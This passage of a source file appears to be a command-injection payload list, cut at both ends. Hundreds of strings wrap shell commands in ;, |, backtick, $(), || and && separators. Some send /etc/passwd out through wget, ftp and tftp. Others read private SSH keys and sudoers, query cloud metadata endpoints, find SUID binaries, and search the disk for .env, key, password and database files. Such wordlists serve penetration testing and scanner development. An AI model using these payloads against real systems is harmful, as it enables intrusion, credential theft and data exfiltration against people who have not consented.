            "&&wget --post-file=/etc/passwd http://127.0.0.1/upload&&",
            "&&ftp -n 127.0.0.1 <<EOF\nuser anonymous anonymous\nbinary\nput /etc/passwd /tmp/passwd\nquit\nEOF&&",
            "&&tftp 127.0.0.1 <<EOF\nput /etc/passwd /tmp/passwd\nquit\nEOF&&",
            

            ";sudo id",
            ";sudo whoami",
            ";sudo cat /etc/sudoers",
            ";sudo -l",
            ";sudo -u root id",
            ";sudo -u root whoami",
            
            "|sudo id",
            "|sudo whoami",
            "|sudo cat /etc/sudoers",
            "|sudo -l",
            "|sudo -u root id",
            "|sudo -u root whoami",
            
            "`sudo id`",
            "`sudo whoami`",
            "`sudo cat /etc/sudoers`",
            "`sudo -l`",
            "`sudo -u root id`",
            "`sudo -u root whoami`",
            
            "$(sudo id)",
            "$(sudo whoami)",
            "$(sudo cat /etc/sudoers)",
            "$(sudo -l)",
            "$(sudo -u root id)",
            "$(sudo -u root whoami)",
            
            "||sudo id||",
            "||sudo whoami||",
            "||sudo cat /etc/sudoers||",
            "||sudo -l||",
            "||sudo -u root id||",
            "||sudo -u root whoami||",
            
            "&&sudo id&&",
            "&&sudo whoami&&",
            "&&sudo cat /etc/sudoers&&",
            "&&sudo -l&&",
            "&&sudo -u root id&&",
            "&&sudo -u root whoami&&",
            

            ";find / -perm -u=s -type f 2>/dev/null",
            ";find / -user root -perm -4000 -print 2>/dev/null",
            ";find / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null",
            
            "|find / -perm -u=s -type f 2>/dev/null",
            "|find / -user root -perm -4000 -print 2>/dev/null",
            "|find / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null",
            
            "`find / -perm -u=s -type f 2>/dev/null`",
            "`find / -user root -perm -4000 -print 2>/dev/null`",
            "`find / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null`",
            
            "$(find / -perm -u=s -type f 2>/dev/null)",
            "$(find / -user root -perm -4000 -print 2>/dev/null)",
            "$(find / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null)",
            
            "||find / -perm -u=s -type f 2>/dev/null||",
            "||find / -user root -perm -4000 -print 2>/dev/null||",
            "||find / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null||",
            
            "&&find / -perm -u=s -type f 2>/dev/null&&",
            "&&find / -user root -perm -4000 -print 2>/dev/null&&",
            "&&find / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null&&",
            

            ";find / -perm -2 -type f 2>/dev/null",
            ";find / -writable -type f 2>/dev/null",
            ";find / -perm -2 -type d 2>/dev/null",
            ";find / -writable -type d 2>/dev/null",
            
            "|find / -perm -2 -type f 2>/dev/null",
            "|find / -writable -type f 2>/dev/null",
            "|find / -perm -2 -type d 2>/dev/null",
            "|find / -writable -type d 2>/dev/null",
            
            "`find / -perm -2 -type f 2>/dev/null`",
            "`find / -writable -type f 2>/dev/null`",
            "`find / -perm -2 -type d 2>/dev/null`",
            "`find / -writable -type d 2>/dev/null`",
            
            "$(find / -perm -2 -type f 2>/dev/null)",
            "$(find / -writable -type f 2>/dev/null)",
            "$(find / -perm -2 -type d 2>/dev/null)",
            "$(find / -writable -type d 2>/dev/null)",
            
            "||find / -perm -2 -type f 2>/dev/null||",
            "||find / -writable -type f 2>/dev/null||",
            "||find / -perm -2 -type d 2>/dev/null||",
            "||find / -writable -type d 2>/dev/null||",
            
            "&&find / -perm -2 -type f 2>/dev/null&&",
            "&&find / -writable -type f 2>/dev/null&&",
            "&&find / -perm -2 -type d 2>/dev/null&&",
            "&&find / -writable -type d 2>/dev/null&&",
            

            ";crontab -l",
            ";cat /etc/crontab",
            ";ls -la /etc/cron.*",
            ";ls -la /var/spool/cron",
            ";cat /var/spool/cron/crontabs/*",
            
            "|crontab -l",
            "|cat /etc/crontab",
            "|ls -la /etc/cron.*",
            "|ls -la /var/spool/cron",
            "|cat /var/spool/cron/crontabs/*",
            
            "`crontab -l`",
            "`cat /etc/crontab`",
            "`ls -la /etc/cron.*`",
            "`ls -la /var/spool/cron`",
            "`cat /var/spool/cron/crontabs/*`",
            
            "$(crontab -l)",
            "$(cat /etc/crontab)",
            "$(ls -la /etc/cron.*)",
            "$(ls -la /var/spool/cron)",
            "$(cat /var/spool/cron/crontabs/*)",
            
            "||crontab -l||",
            "||cat /etc/crontab||",
            "||ls -la /etc/cron.*||",
            "||ls -la /var/spool/cron||",
            "||cat /var/spool/cron/crontabs/*||",
            
            "&&crontab -l&&",
            "&&cat /etc/crontab&&",
            "&&ls -la /etc/cron.*&&",
            "&&ls -la /var/spool/cron&&",
            "&&cat /var/spool/cron/crontabs/*&&",
            

            ";lsmod",
            ";modprobe -l",
            ";cat /proc/modules",
            
            "|lsmod",
            "|modprobe -l",
            "|cat /proc/modules",
            
            "`lsmod`",
            "`modprobe -l`",
            "`cat /proc/modules`",
            
            "$(lsmod)",
            "$(modprobe -l)",
            "$(cat /proc/modules)",
            
            "||lsmod||",
            "||modprobe -l||",
            "||cat /proc/modules||",
            
            "&&lsmod&&",
            "&&modprobe -l&&",
            "&&cat /proc/modules&&",
            

            ";mount",
            ";cat /proc/mounts",
            ";cat /etc/fstab",
            
            "|mount",
            "|cat /proc/mounts",
            "|cat /etc/fstab",
            
            "`mount`",
            "`cat /proc/mounts`",
            "`cat /etc/fstab`",
            
            "$(mount)",
            "$(cat /proc/mounts)",
            "$(cat /etc/fstab)",
            
            "||mount||",
            "||cat /proc/mounts||",
            "||cat /etc/fstab||",
            
            "&&mount&&",
            "&&cat /proc/mounts&&",
            "&&cat /etc/fstab&&",
            

            ";smbclient -L //127.0.0.1",
            ";smbclient //127.0.0.1/share",
            ";showmount -e 127.0.0.1",
            ";nfsstat -m",
            
            "|smbclient -L //127.0.0.1",
            "|smbclient //127.0.0.1/share",
            "|showmount -e 127.0.0.1",
            "|nfsstat -m",
            
            "`smbclient -L //127.0.0.1`",
            "`smbclient //127.0.0.1/share`",
            "`showmount -e 127.0.0.1`",
            "`nfsstat -m`",
            
            "$(smbclient -L //127.0.0.1)",
            "$(smbclient //127.0.0.1/share)",
            "$(showmount -e 127.0.0.1)",
            "$(nfsstat -m)",
            
            "||smbclient -L //127.0.0.1||",
            "||smbclient //127.0.0.1/share||",
            "||showmount -e 127.0.0.1||",
            "||nfsstat -m||",
            
            "&&smbclient -L //127.0.0.1&&",
            "&&smbclient //127.0.0.1/share&&",
            "&&showmount -e 127.0.0.1&&",
            "&&nfsstat -m&&",
            

            ";docker ps",
            ";docker images",
            ";docker network ls",
            ";docker volume ls",
            ";docker info",
            
            "|docker ps",
            "|docker images",
            "|docker network ls",
            "|docker volume ls",
            "|docker info",
            
            "`docker ps`",
            "`docker images`",
            "`docker network ls`",
            "`docker volume ls`",
            "`docker info`",
            
            "$(docker ps)",
            "$(docker images)",
            "$(docker network ls)",
            "$(docker volume ls)",
            "$(docker info)",
            
            "||docker ps||",
            "||docker images||",
            "||docker network ls||",
            "||docker volume ls||",
            "||docker info||",
            
            "&&docker ps&&",
            "&&docker images&&",
            "&&docker network ls&&",
            "&&docker volume ls&&",
            "&&docker info&&",
            

            ";kubectl get pods",
            ";kubectl get services",
            ";kubectl get deployments",
            ";kubectl get nodes",
            ";kubectl cluster-info",
            
            "|kubectl get pods",
            "|kubectl get services",
            "|kubectl get deployments",
            "|kubectl get nodes",
            "|kubectl cluster-info",
            
            "`kubectl get pods`",
            "`kubectl get services`",
            "`kubectl get deployments`",
            "`kubectl get nodes`",
            "`kubectl cluster-info`",
            
            "$(kubectl get pods)",
            "$(kubectl get services)",
            "$(kubectl get deployments)",
            "$(kubectl get nodes)",
            "$(kubectl cluster-info)",
            
            "||kubectl get pods||",
            "||kubectl get services||",
            "||kubectl get deployments||",
            "||kubectl get nodes||",
            "||kubectl cluster-info||",
            
            "&&kubectl get pods&&",
            "&&kubectl get services&&",
            "&&kubectl get deployments&&",
            "&&kubectl get nodes&&",
            "&&kubectl cluster-info&&",
            

            ";curl http://169.254.169.254/latest/meta-data/",
            ";curl http://169.254.169.254/latest/user-data/",
            ";curl http://metadata.google.internal/computeMetadata/v1/",
            ";curl http://metadata.azure.com/metadata/instance",
            
            "|curl http://169.254.169.254/latest/meta-data/",
            "|curl http://169.254.169.254/latest/user-data/",
            "|curl http://metadata.google.internal/computeMetadata/v1/",
            "|curl http://metadata.azure.com/metadata/instance",
            
            "`curl http://169.254.169.254/latest/meta-data/`",
            "`curl http://169.254.169.254/latest/user-data/`",
            "`curl http://metadata.google.internal/computeMetadata/v1/`",
            "`curl http://metadata.azure.com/metadata/instance`",
            
            "$(curl http://169.254.169.254/latest/meta-data/)",
            "$(curl http://169.254.169.254/latest/user-data/)",
            "$(curl http://metadata.google.internal/computeMetadata/v1/)",
            "$(curl http://metadata.azure.com/metadata/instance)",
            
            "||curl http://169.254.169.254/latest/meta-data/||",
            "||curl http://169.254.169.254/latest/user-data/||",
            "||curl http://metadata.google.internal/computeMetadata/v1/||",
            "||curl http://metadata.azure.com/metadata/instance||",
            
            "&&curl http://169.254.169.254/latest/meta-data/&&",
            "&&curl http://169.254.169.254/latest/user-data/&&",
            "&&curl http://metadata.google.internal/computeMetadata/v1/&&",
            "&&curl http://metadata.azure.com/metadata/instance&&",
            

            ";cat /var/www/html/index.php",
            ";cat /var/www/html/config.php",
            ";cat /var/www/html/.env",
            ";ls -la /var/www/html/",
            ";find /var/www/html -name '*.php' -type f",
            
            "|cat /var/www/html/index.php",
            "|cat /var/www/html/config.php",
            "|cat /var/www/html/.env",
            "|ls -la /var/www/html/",
            "|find /var/www/html -name '*.php' -type f",
            
            "`cat /var/www/html/index.php`",
            "`cat /var/www/html/config.php`",
            "`cat /var/www/html/.env`",
            "`ls -la /var/www/html/`",
            "`find /var/www/html -name '*.php' -type f`",
            
            "$(cat /var/www/html/index.php)",
            "$(cat /var/www/html/config.php)",
            "$(cat /var/www/html/.env)",
            "$(ls -la /var/www/html/)",
            "$(find /var/www/html -name '*.php' -type f)",
            
            "||cat /var/www/html/index.php||",
            "||cat /var/www/html/config.php||",
            "||cat /var/www/html/.env||",
            "||ls -la /var/www/html/||",
            "||find /var/www/html -name '*.php' -type f||",
            
            "&&cat /var/www/html/index.php&&",
            "&&cat /var/www/html/config.php&&",
            "&&cat /var/www/html/.env&&",
            "&&ls -la /var/www/html/&&",
            "&&find /var/www/html -name '*.php' -type f&&",
            

            ";cat /var/log/apache2/access.log",
            ";cat /var/log/apache2/error.log",
            ";cat /var/log/nginx/access.log",
            ";cat /var/log/nginx/error.log",
            ";tail -f /var/log/apache2/access.log",
            
            "|cat /var/log/apache2/access.log",
            "|cat /var/log/apache2/error.log",
            "|cat /var/log/nginx/access.log",
            "|cat /var/log/nginx/error.log",
            "|tail -f /var/log/apache2/access.log",
            
            "`cat /var/log/apache2/access.log`",
            "`cat /var/log/apache2/error.log`",
            "`cat /var/log/nginx/access.log`",
            "`cat /var/log/nginx/error.log`",
            "`tail -f /var/log/apache2/access.log`",
            
            "$(cat /var/log/apache2/access.log)",
            "$(cat /var/log/apache2/error.log)",
            "$(cat /var/log/nginx/access.log)",
            "$(cat /var/log/nginx/error.log)",
            "$(tail -f /var/log/apache2/access.log)",
            
            "||cat /var/log/apache2/access.log||",
            "||cat /var/log/apache2/error.log||",
            "||cat /var/log/nginx/access.log||",
            "||cat /var/log/nginx/error.log||",
            "||tail -f /var/log/apache2/access.log||",
            
            "&&cat /var/log/apache2/access.log&&",
            "&&cat /var/log/apache2/error.log&&",
            "&&cat /var/log/nginx/access.log&&",
            "&&cat /var/log/nginx/error.log&&",
            "&&tail -f /var/log/apache2/access.log&&",
            

            ";find / -name '*.bak' -type f",
            ";find / -name '*.backup' -type f",
            ";find / -name '*.old' -type f",
            ";find / -name '*.orig' -type f",
            ";find / -name '*.copy' -type f",
            
            "|find / -name '*.bak' -type f",
            "|find / -name '*.backup' -type f",
            "|find / -name '*.old' -type f",
            "|find / -name '*.orig' -type f",
            "|find / -name '*.copy' -type f",
            
            "`find / -name '*.bak' -type f`",
            "`find / -name '*.backup' -type f`",
            "`find / -name '*.old' -type f`",
            "`find / -name '*.orig' -type f`",
            "`find / -name '*.copy' -type f`",
            
            "$(find / -name '*.bak' -type f)",
            "$(find / -name '*.backup' -type f)",
            "$(find / -name '*.old' -type f)",
            "$(find / -name '*.orig' -type f)",
            "$(find / -name '*.copy' -type f)",
            
            "||find / -name '*.bak' -type f||",
            "||find / -name '*.backup' -type f||",
            "||find / -name '*.old' -type f||",
            "||find / -name '*.orig' -type f||",
            "||find / -name '*.copy' -type f||",
            
            "&&find / -name '*.bak' -type f&&",
            "&&find / -name '*.backup' -type f&&",
            "&&find / -name '*.old' -type f&&",
            "&&find / -name '*.orig' -type f&&",
            "&&find / -name '*.copy' -type f&&",
            

            ";find / -name '*.conf' -type f",
            ";find / -name '*.config' -type f",
            ";find / -name '*.cfg' -type f",
            ";find / -name '*.ini' -type f",
            ";find / -name '*.yml' -type f",
            ";find / -name '*.yaml' -type f",
            ";find / -name '*.json' -type f",
            ";find / -name '*.xml' -type f",
            
            "|find / -name '*.conf' -type f",
            "|find / -name '*.config' -type f",
            "|find / -name '*.cfg' -type f",
            "|find / -name '*.ini' -type f",
            "|find / -name '*.yml' -type f",
            "|find / -name '*.yaml' -type f",
            "|find / -name '*.json' -type f",
            "|find / -name '*.xml' -type f",
            
            "`find / -name '*.conf' -type f`",
            "`find / -name '*.config' -type f`",
            "`find / -name '*.cfg' -type f`",
            "`find / -name '*.ini' -type f`",
            "`find / -name '*.yml' -type f`",
            "`find / -name '*.yaml' -type f`",
            "`find / -name '*.json' -type f`",
            "`find / -name '*.xml' -type f`",
            
            "$(find / -name '*.conf' -type f)",
            "$(find / -name '*.config' -type f)",
            "$(find / -name '*.cfg' -type f)",
            "$(find / -name '*.ini' -type f)",
            "$(find / -name '*.yml' -type f)",
            "$(find / -name '*.yaml' -type f)",
            "$(find / -name '*.json' -type f)",
            "$(find / -name '*.xml' -type f)",
            
            "||find / -name '*.conf' -type f||",
            "||find / -name '*.config' -type f||",
            "||find / -name '*.cfg' -type f||",
            "||find / -name '*.ini' -type f||",
            "||find / -name '*.yml' -type f||",
            "||find / -name '*.yaml' -type f||",
            "||find / -name '*.json' -type f||",
            "||find / -name '*.xml' -type f||",
            
            "&&find / -name '*.conf' -type f&&",
            "&&find / -name '*.config' -type f&&",
            "&&find / -name '*.cfg' -type f&&",
            "&&find / -name '*.ini' -type f&&",
            "&&find / -name '*.yml' -type f&&",
            "&&find / -name '*.yaml' -type f&&",
            "&&find / -name '*.json' -type f&&",
            "&&find / -name '*.xml' -type f&&",
            

            ";find / -name '*.php' -type f",
            ";find / -name '*.js' -type f",
            ";find / -name '*.py' -type f",
            ";find / -name '*.java' -type f",
            ";find / -name '*.c' -type f",
            ";find / -name '*.cpp' -type f",
            ";find / -name '*.go' -type f",
            ";find / -name '*.rb' -type f",
            
            "|find / -name '*.php' -type f",
            "|find / -name '*.js' -type f",
            "|find / -name '*.py' -type f",
            "|find / -name '*.java' -type f",
            "|find / -name '*.c' -type f",
            "|find / -name '*.cpp' -type f",
            "|find / -name '*.go' -type f",
            "|find / -name '*.rb' -type f",
            
            "`find / -name '*.php' -type f`",
            "`find / -name '*.js' -type f`",
            "`find / -name '*.py' -type f`",
            "`find / -name '*.java' -type f`",
            "`find / -name '*.c' -type f`",
            "`find / -name '*.cpp' -type f`",
            "`find / -name '*.go' -type f`",
            "`find / -name '*.rb' -type f`",
            
            "$(find / -name '*.php' -type f)",
            "$(find / -name '*.js' -type f)",
            "$(find / -name '*.py' -type f)",
            "$(find / -name '*.java' -type f)",
            "$(find / -name '*.c' -type f)",
            "$(find / -name '*.cpp' -type f)",
            "$(find / -name '*.go' -type f)",
            "$(find / -name '*.rb' -type f)",
            
            "||find / -name '*.php' -type f||",
            "||find / -name '*.js' -type f||",
            "||find / -name '*.py' -type f||",
            "||find / -name '*.java' -type f||",
            "||find / -name '*.c' -type f||",
            "||find / -name '*.cpp' -type f||",
            "||find / -name '*.go' -type f||",
            "||find / -name '*.rb' -type f||",
            
            "&&find / -name '*.php' -type f&&",
            "&&find / -name '*.js' -type f&&",
            "&&find / -name '*.py' -type f&&",
            "&&find / -name '*.java' -type f&&",
            "&&find / -name '*.c' -type f&&",
            "&&find / -name '*.cpp' -type f&&",
            "&&find / -name '*.go' -type f&&",
            "&&find / -name '*.rb' -type f&&",
            

            ";find / -name '*.db' -type f",
            ";find / -name '*.sql' -type f",
            ";find / -name '*.sqlite' -type f",
            ";find / -name '*.sqlite3' -type f",
            ";find / -name '*.mdb' -type f",
            ";find / -name '*.accdb' -type f",
            
            "|find / -name '*.db' -type f",
            "|find / -name '*.sql' -type f",
            "|find / -name '*.sqlite' -type f",
            "|find / -name '*.sqlite3' -type f",
            "|find / -name '*.mdb' -type f",
            "|find / -name '*.accdb' -type f",
            
            "`find / -name '*.db' -type f`",
            "`find / -name '*.sql' -type f`",
            "`find / -name '*.sqlite' -type f`",
            "`find / -name '*.sqlite3' -type f`",
            "`find / -name '*.mdb' -type f`",
            "`find / -name '*.accdb' -type f`",
            
            "$(find / -name '*.db' -type f)",
            "$(find / -name '*.sql' -type f)",
            "$(find / -name '*.sqlite' -type f)",
            "$(find / -name '*.sqlite3' -type f)",
            "$(find / -name '*.mdb' -type f)",
            "$(find / -name '*.accdb' -type f)",
            
            "||find / -name '*.db' -type f||",
            "||find / -name '*.sql' -type f||",
            "||find / -name '*.sqlite' -type f||",
            "||find / -name '*.sqlite3' -type f||",
            "||find / -name '*.mdb' -type f||",
            "||find / -name '*.accdb' -type f||",
            
            "&&find / -name '*.db' -type f&&",
            "&&find / -name '*.sql' -type f&&",
            "&&find / -name '*.sqlite' -type f&&",
            "&&find / -name '*.sqlite3' -type f&&",
            "&&find / -name '*.mdb' -type f&&",
            "&&find / -name '*.accdb' -type f&&",
            

            ";find / -name '*.pem' -type f",
            ";find / -name '*.crt' -type f",
            ";find / -name '*.key' -type f",
            ";find / -name '*.pfx' -type f",
            ";find / -name '*.p12' -type f",
            ";find / -name '*.cer' -type f",
            
            "|find / -name '*.pem' -type f",
            "|find / -name '*.crt' -type f",
            "|find / -name '*.key' -type f",
            "|find / -name '*.pfx' -type f",
            "|find / -name '*.p12' -type f",
            "|find / -name '*.cer' -type f",
            
            "`find / -name '*.pem' -type f`",
            "`find / -name '*.crt' -type f`",
            "`find / -name '*.key' -type f`",
            "`find / -name '*.pfx' -type f`",
            "`find / -name '*.p12' -type f`",
            "`find / -name '*.cer' -type f`",
            
            "$(find / -name '*.pem' -type f)",
            "$(find / -name '*.crt' -type f)",
            "$(find / -name '*.key' -type f)",
            "$(find / -name '*.pfx' -type f)",
            "$(find / -name '*.p12' -type f)",
            "$(find / -name '*.cer' -type f)",
            
            "||find / -name '*.pem' -type f||",
            "||find / -name '*.crt' -type f||",
            "||find / -name '*.key' -type f||",
            "||find / -name '*.pfx' -type f||",
            "||find / -name '*.p12' -type f||",
            "||find / -name '*.cer' -type f||",
            
            "&&find / -name '*.pem' -type f&&",
            "&&find / -name '*.crt' -type f&&",
            "&&find / -name '*.key' -type f&&",
            "&&find / -name '*.pfx' -type f&&",
            "&&find / -name '*.p12' -type f&&",
            "&&find / -name '*.cer' -type f&&",
            

            ";find / -name '*.zip' -type f",
            ";find / -name '*.tar' -type f",
            ";find / -name '*.tar.gz' -type f",
            ";find / -name '*.tgz' -type f",
            ";find / -name '*.rar' -type f",
            ";find / -name '*.7z' -type f",
            ";find / -name '*.gz' -type f",
            ";find / -name '*.bz2' -type f",
            
            "|find / -name '*.zip' -type f",
            "|find / -name '*.tar' -type f",
            "|find / -name '*.tar.gz' -type f",
            "|find / -name '*.tgz' -type f",
            "|find / -name '*.rar' -type f",
            "|find / -name '*.7z' -type f",
            "|find / -name '*.gz' -type f",
            "|find / -name '*.bz2' -type f",
            
            "`find / -name '*.zip' -type f`",
            "`find / -name '*.tar' -type f`",
            "`find / -name '*.tar.gz' -type f`",
            "`find / -name '*.tgz' -type f`",
            "`find / -name '*.rar' -type f`",
            "`find / -name '*.7z' -type f`",
            "`find / -name '*.gz' -type f`",
            "`find / -name '*.bz2' -type f`",
            
            "$(find / -name '*.zip' -type f)",
            "$(find / -name '*.tar' -type f)",
            "$(find / -name '*.tar.gz' -type f)",
            "$(find / -name '*.tgz' -type f)",
            "$(find / -name '*.rar' -type f)",
            "$(find / -name '*.7z' -type f)",
            "$(find / -name '*.gz' -type f)",
            "$(find / -name '*.bz2' -type f)",
            
            "||find / -name '*.zip' -type f||",
            "||find / -name '*.tar' -type f||",
            "||find / -name '*.tar.gz' -type f||",
            "||find / -name '*.tgz' -type f||",
            "||find / -name '*.rar' -type f||",
            "||find / -name '*.7z' -type f||",
            "||find / -name '*.gz' -type f||",
            "||find / -name '*.bz2' -type f||",
            
            "&&find / -name '*.zip' -type f&&",
            "&&find / -name '*.tar' -type f&&",
            "&&find / -name '*.tar.gz' -type f&&",
            "&&find / -name '*.tgz' -type f&&",
            "&&find / -name '*.rar' -type f&&",
            "&&find / -name '*.7z' -type f&&",
            "&&find / -name '*.gz' -type f&&",
            "&&find / -name '*.bz2' -type f&&",
            

            ";find / -name '*.log' -type f",
            ";find / -name '*.log.*' -type f",
            ";find / -name '*access*log*' -type f",
            ";find / -name '*error*log*' -type f",
            ";find / -name '*debug*log*' -type f",
            ";find / -name '*audit*log*' -type f",
            
            "|find / -name '*.log' -type f",
            "|find / -name '*.log.*' -type f",
            "|find / -name '*access*log*' -type f",
            "|find / -name '*error*log*' -type f",
            "|find / -name '*debug*log*' -type f",
            "|find / -name '*audit*log*' -type f",
            
            "`find / -name '*.log' -type f`",
            "`find / -name '*.log.*' -type f`",
            "`find / -name '*access*log*' -type f`",
            "`find / -name '*error*log*' -type f`",
            "`find / -name '*debug*log*' -type f`",
            "`find / -name '*audit*log*' -type f`",
            
            "$(find / -name '*.log' -type f)",
            "$(find / -name '*.log.*' -type f)",
            "$(find / -name '*access*log*' -type f)",
            "$(find / -name '*error*log*' -type f)",
            "$(find / -name '*debug*log*' -type f)",
            "$(find / -name '*audit*log*' -type f)",
            
            "||find / -name '*.log' -type f||",
            "||find / -name '*.log.*' -type f||",
            "||find / -name '*access*log*' -type f||",
            "||find / -name '*error*log*' -type f||",
            "||find / -name '*debug*log*' -type f||",
            "||find / -name '*audit*log*' -type f||",
            
            "&&find / -name '*.log' -type f&&",
            "&&find / -name '*.log.*' -type f&&",
            "&&find / -name '*access*log*' -type f&&",
            "&&find / -name '*error*log*' -type f&&",
            "&&find / -name '*debug*log*' -type f&&",
            "&&find / -name '*audit*log*' -type f&&",
            

            ";find /tmp -type f",
            ";find /var/tmp -type f",
            ";find /dev/shm -type f",
            ";ls -la /tmp",
            ";ls -la /var/tmp",
            ";ls -la /dev/shm",
            
            "|find /tmp -type f",
            "|find /var/tmp -type f",
            "|find /dev/shm -type f",
            "|ls -la /tmp",
            "|ls -la /var/tmp",
            "|ls -la /dev/shm",
            
            "`find /tmp -type f`",
            "`find /var/tmp -type f`",
            "`find /dev/shm -type f`",
            "`ls -la /tmp`",
            "`ls -la /var/tmp`",
            "`ls -la /dev/shm`",
            
            "$(find /tmp -type f)",
            "$(find /var/tmp -type f)",
            "$(find /dev/shm -type f)",
            "$(ls -la /tmp)",
            "$(ls -la /var/tmp)",
            "$(ls -la /dev/shm)",
            
            "||find /tmp -type f||",
            "||find /var/tmp -type f||",
            "||find /dev/shm -type f||",
            "||ls -la /tmp||",
            "||ls -la /var/tmp||",
            "||ls -la /dev/shm||",
            
            "&&find /tmp -type f&&",
            "&&find /var/tmp -type f&&",
            "&&find /dev/shm -type f&&",
            "&&ls -la /tmp&&",
            "&&ls -la /var/tmp&&",
            "&&ls -la /dev/shm&&",
            

            ";find / -name 'authorized_keys' -type f",
            ";find / -name 'id_rsa' -type f",
            ";find / -name 'id_dsa' -type f",
            ";find / -name '*.pub' -type f",
            ";cat ~/.ssh/authorized_keys",
            ";cat ~/.ssh/id_rsa",
            ";cat ~/.ssh/id_dsa",
            ";cat ~/.ssh/known_hosts",
            
            "|find / -name 'authorized_keys' -type f",
            "|find / -name 'id_rsa' -type f",
            "|find / -name 'id_dsa' -type f",
            "|find / -name '*.pub' -type f",
            "|cat ~/.ssh/authorized_keys",
            "|cat ~/.ssh/id_rsa",
            "|cat ~/.ssh/id_dsa",
            "|cat ~/.ssh/known_hosts",
            
            "`find / -name 'authorized_keys' -type f`",
            "`find / -name 'id_rsa' -type f`",
            "`find / -name 'id_dsa' -type f`",
            "`find / -name '*.pub' -type f`",
            "`cat ~/.ssh/authorized_keys`",
            "`cat ~/.ssh/id_rsa`",
            "`cat ~/.ssh/id_dsa`",
            "`cat ~/.ssh/known_hosts`",
            
            "$(find / -name 'authorized_keys' -type f)",
            "$(find / -name 'id_rsa' -type f)",
            "$(find / -name 'id_dsa' -type f)",
            "$(find / -name '*.pub' -type f)",
            "$(cat ~/.ssh/authorized_keys)",
            "$(cat ~/.ssh/id_rsa)",
            "$(cat ~/.ssh/id_dsa)",
            "$(cat ~/.ssh/known_hosts)",
            
            "||find / -name 'authorized_keys' -type f||",
            "||find / -name 'id_rsa' -type f||",
            "||find / -name 'id_dsa' -type f||",
            "||find / -name '*.pub' -type f||",
            "||cat ~/.ssh/authorized_keys||",
            "||cat ~/.ssh/id_rsa||",
            "||cat ~/.ssh/id_dsa||",
            "||cat ~/.ssh/known_hosts||",
            
            "&&find / -name 'authorized_keys' -type f&&",
            "&&find / -name 'id_rsa' -type f&&",
            "&&find / -name 'id_dsa' -type f&&",
            "&&find / -name '*.pub' -type f&&",
            "&&cat ~/.ssh/authorized_keys&&",
            "&&cat ~/.ssh/id_rsa&&",
            "&&cat ~/.ssh/id_dsa&&",
            "&&cat ~/.ssh/known_hosts&&",
            

            ";find / -name 'passwd' -type f",
            ";find / -name 'password' -type f",
            ";find / -name 'pwd' -type f",
            ";find / -name 'secret' -type f",
            ";find / -name '*.pass' -type f",
            ";find / -name '*.pwd' -type f",
            ";find / -name '*.secret' -type f",
            
            "|find / -name 'passwd' -type f",
            "|find / -name 'password' -type f",
            "|find / -name 'pwd' -type f",
            "|find / -name 'secret' -type f",
            "|find / -name '*.pass' -type f",
            "|find / -name '*.pwd' -type f",
            "|find / -name '*.secret' -type f",
            
            "`find / -name 'passwd' -type f`",
            "`find / -name 'password' -type f`",
            "`find / -name 'pwd' -type f`",
            "`find / -name 'secret' -type f`",
            "`find / -name '*.pass' -type f`",
            "`find / -name '*.pwd' -type f`",
            "`find / -name '*.secret' -type f`",
            
            "$(find / -name 'passwd' -type f)",
            "$(find / -name 'password' -type f)",
            "$(find / -name 'pwd' -type f)",
            "$(find / -name 'secret' -type f)",
            "$(find / -name '*.pass' -type f)",
            "$(find / -name '*.pwd' -type f)",
            "$(find / -name '*.secret' -type f)",
            
            "||find / -name 'passwd' -type f||",
            "||find / -name 'password' -type f||",
            "||find / -name 'pwd' -type f||",
            "||find / -name 'secret' -type f||",
            "||find / -name '*.pass' -type f||",
            "||find / -name '*.pwd' -type f||",
            "||find / -name '*.secret' -type f||",
            
            "&&find / -name 'passwd' -type f&&",
            "&&find / -name 'password' -type f&&",
            "&&find / -name 'pwd' -type f&&",
            "&&find / -name 'secret' -type f&&",
            "&&find / -name '*.pass' -type f&&",
            "&&find / -name '*.pwd' -type f&&",
            "&&find / -name '*.secret' -type f&&",
            

            ";find / -name '.env' -type f",
            ";find / -name 'env' -type f",
            ";find / -name 'environment' -type f",
            ";find / -name '.environment' -type f",
            ";find / -name '*.env' -type f",
            ";find / -name '*environment*' -type f",
            
            "|find / -name '.env' -type f",
            "|find / -name 'env' -type f",
            "|find / -name 'environment' -type f",
            "|find / -name '.environment' -type f",
            "|find / -name '*.env' -type f",
            "|find / -name '*environment*' -type f",
            
            "`find / -name '.env' -type f`",
            "`find / -name 'env' -type f`",
            "`find / -name 'environment' -type f`",
            "`find / -name '.environment' -type f`",
            "`find / -name '*.env' -type f`",
            "`find / -name '*environment*' -type f`",
            
            "$(find / -name '.env' -type f)",
            "$(find / -name 'env' -type f)",
            "$(find / -name 'environment' -type f)",
            "$(find / -name '.environment' -type f)",
            "$(find / -name '*.env' -type f)",
            "$(find / -name '*environment*' -type f)",
            
            "||find / -name '.env' -type f||",
            "||find / -name 'env' -type f||",
            "||find / -name 'environment' -type f||",
            "||find / -name '.environment' -type f||",
            "||find / -name '*.env' -type f||",
            "||find / -name '*environment*' -type f||",
            
            "&&find / -name '.env' -type f&&",
            "&&find / -name 'env' -type f&&",
            "&&find / -name 'environment' -type f&&",
            "&&find / -name '.environment' -type f&&",
            "&&find / -name '*.env' -type f&&",
            "&&find / -name '*environment*' -type f&&",
            

            ";find / -name '.git' -type d",
            ";find / -name '.gitignore' -type f",
            ";find / -name '.gitconfig' -type f",
            ";find / -name '.gitattributes' -type f",
            ";find / -name '*.git' -type f",
            
            "|find / -name '.git' -type d",
            "|find / -name '.gitignore' -type f",
            "|find / -name '.gitconfig' -type f",
            "|find / -name '.gitattributes' -type f",
            "|find / -name '*.git' -type f",
            
            "`find / -name '.git' -type d`",
            "`find / -name '.gitignore' -type f`",
            "`find / -name '.gitconfig' -type f`",
            "`find / -name '.gitattributes' -type f`",
            "`find / -name '*.git' -type f`",
            
            "$(find / -name '.git' -type d)",
            "$(find / -name '.gitignore' -type f)",
            "$(find / -name '.gitconfig' -type f)",
            "$(find / -name '.gitattributes' -type f)",
            "$(find / -name '*.git' -type f)",
            
            "||find / -name '.git' -type d||",
            "||find / -name '.gitignore' -type f||",
            "||find / -name '.gitconfig' -type f||",
            "||find / -name '.gitattributes' -type f||",
            "||find / -name '*.git' -type f||",
            
            "&&find / -name '.git' -type d&&",
